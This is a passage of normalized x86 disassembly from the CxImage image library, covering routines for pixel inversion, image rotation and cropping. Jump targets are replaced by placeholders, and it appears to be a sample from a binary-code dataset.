sub ecx eax
push ecx
mov edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?SetPixelIndex@CxImage@@QAEXJJE@Z
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call ?SelectionIsInside@CxImage@@QAE_NJJ@Z
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp - 0x30 ]
add eax 0x1
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
and eax 0xff
mov ecx 0xff
sub ecx eax
push ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call ?SetPixelIndex@CxImage@@QAEXJJE@Z
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
?Rotate@CxImage@@QAE_NMPAV1@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434d0c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2ec
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x2f8 ]
mov ecx 0xbb
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
fld [ ebp + 0x8 ]
fchs
fstp [ ebp - 0x268 ]
push 0x0
push 0x0
call acos
add esp 0x8
fmul [ ebp - 0x268 ]
fdiv [ r--data ]
fstp [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
call ?GetWidth@CxImage@@QBEKXZ
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x10 ]
call ?GetHeight@CxImage@@QBEKXZ
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp - 0x18 ]
push edx
call cos
add esp 0x8
fstp [ ebp - 0x30 ]
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sin
add esp 0x8
fstp [ ebp - 0x38 ]
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x3c ] 0x0
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x50 ] 0x0
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x24 ]
sub ecx 0x1
mov [ ebp - 0x58 ] ecx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x54 ] edx
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x60 ] eax
mov ecx [ ebp - 0x3c ]
mov [ ebp - 0x5c ] ecx
fild [ ebp - 0x48 ]
fmul [ ebp - 0x30 ]
fild [ ebp - 0x44 ]
fmul [ ebp - 0x38 ]
fsubp st1
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0x68 ] eax
fild [ ebp - 0x48 ]
fmul [ ebp - 0x38 ]
fild [ ebp - 0x44 ]
fmul [ ebp - 0x30 ]
faddp st1
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0x64 ] eax
fild [ ebp - 0x50 ]
fmul [ ebp - 0x30 ]
fild [ ebp - 0x4c ]
fmul [ ebp - 0x38 ]
fsubp st1
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0x70 ] eax
fild [ ebp - 0x50 ]
fmul [ ebp - 0x38 ]
fild [ ebp - 0x4c ]
fmul [ ebp - 0x30 ]
faddp st1
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0x6c ] eax
fild [ ebp - 0x58 ]
fmul [ ebp - 0x30 ]
fild [ ebp - 0x54 ]
fmul [ ebp - 0x38 ]
fsubp st1
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0x78 ] eax
fild [ ebp - 0x58 ]
fmul [ ebp - 0x38 ]
fild [ ebp - 0x54 ]
fmul [ ebp - 0x30 ]
faddp st1
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
mov [ ebp - 0x74 ] eax
mov edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x68 ]
jge r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x68 ]
mov [ ebp - 0x26c ] ecx
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x26c ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x2f8
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp - 0x78 ]
mov [ ebp - 0x270 ] ecx
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x270 ] eax
jmp r-xdata
mov edx [ ebp - 0x70 ]
cmp edx [ ebp - 0x78 ]
jge r-xdata
mov ecx [ ebp - 0x70 ]
cmp ecx [ ebp - 0x78 ]
jge r-xdata
mov eax [ ebp - 0x60 ]
cmp eax [ ebp - 0x68 ]
jge r-xdata
mov edx [ ebp - 0x26c ]
cmp edx [ ebp - 0x270 ]
jge r-xdata
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x27c ] eax
mov edx [ ebp - 0x70 ]
mov [ ebp - 0x27c ] edx
jmp r-xdata
mov edx [ ebp - 0x68 ]
mov [ ebp - 0x274 ] edx
mov ecx [ ebp - 0x60 ]
mov [ ebp - 0x274 ] ecx
jmp r-xdata
mov edx [ ebp - 0x64 ]
mov [ ebp - 0x280 ] edx
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x280 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x27c ]
mov [ ebp - 0x278 ] ecx
mov edx [ ebp - 0x278 ]
mov [ ebp - 0x80 ] edx
mov eax [ ebp - 0x5c ]
cmp eax [ ebp - 0x64 ]
jge r-xdata
mov eax [ ebp - 0x274 ]
mov [ ebp - 0x278 ] eax
jmp r-xdata
mov edx [ ebp - 0x74 ]
mov [ ebp - 0x284 ] edx
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x284 ] ecx
jmp r-xdata
mov eax [ ebp - 0x6c ]
cmp eax [ ebp - 0x74 ]
jge r-xdata
mov edx [ ebp - 0x6c ]
cmp edx [ ebp - 0x74 ]
jge r-xdata
mov ecx [ ebp - 0x5c ]
cmp ecx [ ebp - 0x64 ]
jge r-xdata
mov eax [ ebp - 0x280 ]
cmp eax [ ebp - 0x284 ]
jge r-xdata
mov ecx [ ebp - 0x74 ]
mov [ ebp - 0x290 ] ecx
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x290 ] eax
jmp r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x288 ] eax
mov edx [ ebp - 0x5c ]
mov [ ebp - 0x288 ] edx
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov [ ebp - 0x294 ] eax
mov edx [ ebp - 0x60 ]
mov [ ebp - 0x294 ] edx
jmp r-xdata
mov edx [ ebp - 0x290 ]
mov [ ebp - 0x28c ] edx
mov eax [ ebp - 0x28c ]
mov [ ebp - 0x7c ] eax
mov ecx [ ebp - 0x60 ]
cmp ecx [ ebp - 0x68 ]
jle r-xdata
mov ecx [ ebp - 0x288 ]
mov [ ebp - 0x28c ] ecx
jmp r-xdata
mov eax [ ebp - 0x78 ]
mov [ ebp - 0x298 ] eax
mov edx [ ebp - 0x70 ]
mov [ ebp - 0x298 ] edx
jmp r-xdata
mov ecx [ ebp - 0x70 ]
cmp ecx [ ebp - 0x78 ]
jle r-xdata
mov eax [ ebp - 0x70 ]
cmp eax [ ebp - 0x78 ]
jle r-xdata
mov edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x68 ]
jle r-xdata
mov ecx [ ebp - 0x294 ]
cmp ecx [ ebp - 0x298 ]
jle r-xdata
mov edx [ ebp - 0x78 ]
mov [ ebp - 0x2a4 ] edx
mov ecx [ ebp - 0x70 ]
mov [ ebp - 0x2a4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x68 ]
mov [ ebp - 0x29c ] ecx
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x29c ] eax
jmp r-xdata
mov ecx [ ebp - 0x64 ]
mov [ ebp - 0x2a8 ] ecx
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2a8 ] eax
jmp r-xdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x2a0 ] eax
mov ecx [ ebp - 0x2a0 ]
mov [ ebp - 0x98 ] ecx
mov edx [ ebp - 0x5c ]
cmp edx [ ebp - 0x64 ]
jle r-xdata
mov edx [ ebp - 0x29c ]
mov [ ebp - 0x2a0 ] edx
jmp r-xdata
mov ecx [ ebp - 0x74 ]
mov [ ebp - 0x2ac ] ecx
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x2ac ] eax
jmp r-xdata
mov edx [ ebp - 0x6c ]
cmp edx [ ebp - 0x74 ]
jle r-xdata
mov ecx [ ebp - 0x6c ]
cmp ecx [ ebp - 0x74 ]
jle r-xdata
mov eax [ ebp - 0x5c ]
cmp eax [ ebp - 0x64 ]
jle r-xdata
mov edx [ ebp - 0x2a8 ]
cmp edx [ ebp - 0x2ac ]
jle r-xdata
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x2b8 ] eax
mov edx [ ebp - 0x6c ]
mov [ ebp - 0x2b8 ] edx
jmp r-xdata
mov edx [ ebp - 0x64 ]
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x5c ]
mov [ ebp - 0x2b0 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x28 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x240 ]
call ?AlphaCreate@CxImage@@QAEXXZ
lea ecx [ ebp - 0x240 ]
call ?AlphaClear@CxImage@@QAEXXZ
mov ecx [ ebp - 0x2b8 ]
mov [ ebp - 0x2b4 ] ecx
mov edx [ ebp - 0x2b4 ]
mov [ ebp - 0x94 ] edx
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x90 ] eax
mov ecx [ ebp - 0x94 ]
add ecx 0x2
mov [ ebp - 0x8c ] ecx
mov edx [ ebp - 0x98 ]
add edx 0x2
mov [ ebp - 0x88 ] edx
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x84 ] eax
mov ecx [ ebp - 0x88 ]
sub ecx [ ebp - 0x80 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x8c ]
sub edx [ ebp - 0x7c ]
mov [ ebp - 0x20 ] edx
push 0x0
lea ecx [ ebp - 0x240 ]
call ??0CxImage@@QAE@K@Z
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x240 ]
call ?CopyInfo@CxImage@@IAEXABV1@@Z
mov ecx [ ebp - 0x10 ]
call ?GetType@CxImage@@QBEKXZ
push eax
mov ecx [ ebp - 0x10 ]
call ?GetBpp@CxImage@@QBEGXZ
and eax 0xffff
push eax
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
lea ecx [ ebp - 0x240 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
push 0x100
mov ecx [ ebp - 0x10 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
push eax
lea ecx [ ebp - 0x240 ]
call ?SetPalette@CxImage@@QAEXPAUtagRGBQUAD@@K@Z
mov ecx [ ebp - 0x10 ]
call ?AlphaIsValid@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp - 0x2b0 ]
mov [ ebp - 0x2b4 ] eax
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x250 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x7c ]
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x250 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x248 ]
cmp eax [ ebp - 0x8c ]
jg r-xdata
mov ecx [ ebp - 0x248 ]
cmp ecx [ ebp - 0x8c ]
jg r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x250 ]
imul eax eax 0x64
cdq
idiv [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx + 0x144 ] eax
mov edx [ ebp - 0x10 ]
cmp [ edx + 0x148 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x250 ]
imul eax eax 0x64
cdq
idiv [ ebp - 0x20 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x144 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x148 ] 0x0
je r-xdata
lea ecx [ ebp - 0x240 ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
lea eax [ ebp - 0x240 ]
push eax
mov ecx [ ebp + 0xc ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x24c ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x80 ]
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x24c ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x260 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x240 ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x260 ]
mov eax [ ebp - 0x244 ]
cmp eax [ ebp - 0x88 ]
jg r-xdata
mov ecx [ ebp - 0x244 ]
cmp ecx [ ebp - 0x88 ]
jg r-xdata
jmp r-xdata
fild [ ebp - 0x244 ]
fmul [ ebp - 0x30 ]
fild [ ebp - 0x248 ]
fmul [ ebp - 0x38 ]
faddp st1
fsub [ r--data ]
call _ftol
mov [ ebp - 0x254 ] eax
fild [ ebp - 0x248 ]
fmul [ ebp - 0x30 ]
fild [ ebp - 0x244 ]
fmul [ ebp - 0x38 ]
fsubp st1
fsub [ r--data ]
call _ftol
mov [ ebp - 0x258 ] eax
mov ecx [ ebp - 0x258 ]
push ecx
mov edx [ ebp - 0x254 ]
push edx
mov ecx [ ebp - 0x10 ]
call ?GetPixelIndex@CxImage@@QAEEJJ@Z
push eax
mov eax [ ebp - 0x250 ]
push eax
mov ecx [ ebp - 0x24c ]
push ecx
lea ecx [ ebp - 0x240 ]
call ?SetPixelIndex@CxImage@@QAEXJJE@Z
mov edx [ ebp - 0x258 ]
push edx
mov eax [ ebp - 0x254 ]
push eax
mov ecx [ ebp - 0x10 ]
call ?AlphaGet@CxImage@@QAEEJJ@Z
push eax
mov ecx [ ebp - 0x250 ]
push ecx
mov edx [ ebp - 0x24c ]
push edx
lea ecx [ ebp - 0x240 ]
call ?AlphaSet@CxImage@@QAEXJJE@Z
jmp r-xdata
jmp r-xdata
fild [ ebp - 0x244 ]
fmul [ ebp - 0x30 ]
fild [ ebp - 0x248 ]
fmul [ ebp - 0x38 ]
faddp st1
fsub [ r--data ]
call _ftol
mov [ ebp - 0x254 ] eax
fild [ ebp - 0x248 ]
fmul [ ebp - 0x30 ]
fild [ ebp - 0x244 ]
fmul [ ebp - 0x38 ]
fsubp st1
fsub [ r--data ]
call _ftol
mov [ ebp - 0x258 ] eax
push 0x0
push 0x1
mov edx [ ebp - 0x258 ]
push edx
mov eax [ ebp - 0x254 ]
push eax
lea ecx [ ebp - 0x25c ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?GetPixelColor@CxImage@@QAE?AUtagRGBQUAD@@JJ_N@Z
mov edx [ eax ]
push edx
mov eax [ ebp - 0x250 ]
push eax
mov ecx [ ebp - 0x24c ]
push ecx
lea ecx [ ebp - 0x240 ]
call ?SetPixelColor@CxImage@@QAEXJJUtagRGBQUAD@@_N@Z
mov edx [ ebp - 0x258 ]
push edx
mov eax [ ebp - 0x254 ]
push eax
mov ecx [ ebp - 0x10 ]
call ?AlphaGet@CxImage@@QAEEJJ@Z
push eax
mov ecx [ ebp - 0x250 ]
push ecx
mov edx [ ebp - 0x24c ]
push edx
lea ecx [ ebp - 0x240 ]
call ?AlphaSet@CxImage@@QAEXJJE@Z
jmp r-xdata
mov ecx [ ebp - 0x248 ]
add ecx 0x1
mov [ ebp - 0x248 ] ecx
mov edx [ ebp - 0x250 ]
add edx 0x1
mov [ ebp - 0x250 ] edx
mov ecx [ ebp - 0x244 ]
add ecx 0x1
mov [ ebp - 0x244 ] ecx
mov edx [ ebp - 0x24c ]
add edx 0x1
mov [ ebp - 0x24c ] edx
mov edx [ ebp - 0x248 ]
add edx 0x1
mov [ ebp - 0x248 ] edx
mov eax [ ebp - 0x250 ]
add eax 0x1
mov [ ebp - 0x250 ] eax
mov edx [ ebp - 0x244 ]
add edx 0x1
mov [ ebp - 0x244 ] edx
mov eax [ ebp - 0x24c ]
add eax 0x1
mov [ ebp - 0x24c ] eax
?CropRotatedRectangle@CxImage@@QAE_NJJJJMPAV1@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434d2c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x224
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x230 ]
mov ecx 0x89
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
fld [ ebp + 0x18 ]
sub esp 0x8
fstp [ esp ]
call cos
add esp 0x8
fstp [ ebp - 0x28 ]
fld [ ebp + 0x18 ]
sub esp 0x8
fstp [ esp ]
call sin
add esp 0x8
fstp [ ebp - 0x30 ]
fld [ ebp + 0x18 ]
sub esp 0x8
fstp [ esp ]
call fabs
add esp 0x8
fcomp [ r--data ]
fnstsw ax
test ah 0x1
je r-xdata
xor al al
jmp r-xdata
fild [ ebp + 0x14 ]
fmul [ ebp - 0x30 ]
call _ftol
mov ecx [ ebp + 0x8 ]
sub ecx eax
cmp [ ebp + 0x8 ] ecx
jge r-xdata
mov ecx [ ebp + 0x1c ]
push ecx
mov edx [ ebp + 0xc ]
add edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
add eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x10 ]
call ?Crop@CxImage@@QAE_NJJJJPAV1@@Z
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x230
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x18
fild [ ebp + 0x14 ]
fmul [ ebp - 0x30 ]
call _ftol
mov ecx [ ebp + 0x8 ]
sub ecx eax
mov [ ebp - 0x1ec ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x1ec ] edx
jmp r-xdata
xor al al
jmp r-xdata
mov edx [ ebp - 0x20 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x10 ]
call ?IsInside@CxImage@@QAE_NJJ@Z
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x1ec ]
mov [ ebp - 0x14 ] edx
fild [ ebp + 0x10 ]
fmul [ ebp - 0x28 ]
call _ftol
mov ecx [ ebp + 0x8 ]
add ecx eax
mov [ ebp - 0x1c ] ecx
fild [ ebp + 0x14 ]
fmul [ ebp - 0x28 ]
fild [ ebp + 0x10 ]
fmul [ ebp - 0x30 ]
faddp st1
call _ftol
mov edx [ ebp + 0xc ]
add edx eax
mov [ ebp - 0x20 ] edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?IsInside@CxImage@@QAE_NJJ@Z
and eax 0xff
test eax eax
je r-xdata
push 0x1
push 0x1
push 0x0
mov ecx [ ebp - 0x10 ]
push ecx
lea ecx [ ebp - 0x1d8 ]
call ??0CxImage@@QAE@ABV0@_N11@Z
mov [ ebp - 0x4 ] 0x0
push 0x1
push 0x0
push 0x1
mov edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x1d8 ]
call ?Copy@CxImage@@QAEXABV1@_N11@Z
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov ecx [ ebp - 0x1c ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x1d8 ]
call ?Crop@CxImage@@QAE_NJJJJPAV1@@Z
and eax 0xff
test eax eax
jne r-xdata
push 0x0
fld [ ebp + 0x18 ]
fchs
fmul [ r--data ]
fst [ ebp - 0x1f0 ]
push ecx
fstp [ esp ]
lea ecx [ ebp - 0x1d8 ]
call ?Rotate@CxImage@@QAE_NMPAV1@@Z
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x1dc ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1d8 ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x1dc ]
jmp r-xdata
mov eax [ ebp - 0x1cc ]
add eax [ ebp + 0x10 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1cc ]
sub eax [ ebp + 0x10 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x1c8 ]
add eax [ ebp + 0x14 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c8 ]
sub eax [ ebp + 0x14 ]
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x20 ] eax
push 0x0
mov ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x1d8 ]
call ?Crop@CxImage@@QAE_NJJJJPAV1@@Z
and eax 0xff
test eax eax
jne r-xdata
mov [ ebp - 0x1e0 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1d8 ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x1e0 ]
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
mov [ ebp - 0x1e4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1d8 ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x1e4 ]
jmp r-xdata
lea eax [ ebp - 0x1d8 ]
push eax
mov ecx [ ebp - 0x10 ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
lea edx [ ebp - 0x1d8 ]
push edx
mov ecx [ ebp + 0x1c ]
call ?Transfer@CxImage@@QAE_NAAV1@@Z
jmp r-xdata
mov [ ebp - 0x1e8 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1d8 ]
call ??1CxImage@@UAE@XZ
mov al [ ebp - 0x1e8 ]
?Crop@CxImage@@QAE_NJJJJPAV1@@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434d4c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x268
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x274 ]
mov ecx 0x9a
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x204 ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x204 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x274
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax + 0xc ]
jge r-xdata
mov [ ebp - 0x208 ] 0x0
jmp r-xdata
cmp [ ebp - 0x204 ] 0x0
jge r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x20c ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20c ] edx
jmp r-xdata
mov eax [ ebp - 0x208 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x210 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x210 ] eax
jmp r-xdata
mov edx [ ebp - 0x20c ]
mov [ ebp - 0x208 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xc ]
jge r-xdata
mov [ ebp - 0x214 ] 0x0
jmp r-xdata
cmp [ ebp - 0x210 ] 0x0
jge r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x218 ] ecx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x218 ] edx
jmp r-xdata
mov eax [ ebp - 0x214 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
cmp edx [ ecx + 0x10 ]
jge r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x21c ] edx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov edx [ ebp - 0x218 ]
mov [ ebp - 0x214 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0xc ]
cmp ecx [ eax + 0x10 ]
jge r-xdata
mov [ ebp - 0x220 ] 0x0
jmp r-xdata
cmp [ ebp - 0x21c ] 0x0
jge r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
mov [ ebp - 0x224 ] ecx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x224 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
sub ecx [ ebp - 0x220 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
cmp eax [ edx + 0x10 ]
jge r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x228 ] eax
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x228 ] ecx
jmp r-xdata
mov edx [ ebp - 0x224 ]
mov [ ebp - 0x220 ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ecx + 0x10 ]
jge r-xdata
mov [ ebp - 0x22c ] 0x0
jmp r-xdata
cmp [ ebp - 0x228 ] 0x0
jge r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x230 ] edx
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x230 ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x10 ]
sub edx [ ebp - 0x22c ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor al al
jmp r-xdata
mov ecx [ ebp - 0x1c ]
cmp ecx [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x230 ]
mov [ ebp - 0x22c ] eax
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x18 ]
jle r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x20 ]
jle r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x40 ]
push edx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + 0x16 ]
push ecx
mov edx [ ebp - 0x20 ]
sub edx [ ebp - 0x1c ]
push edx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x1d0 ]
call ??0CxImage@@QAE@KKKK@Z
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x28 ]
push edx
mov ecx [ ebp - 0x10 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
push eax
lea ecx [ ebp - 0x1d0 ]
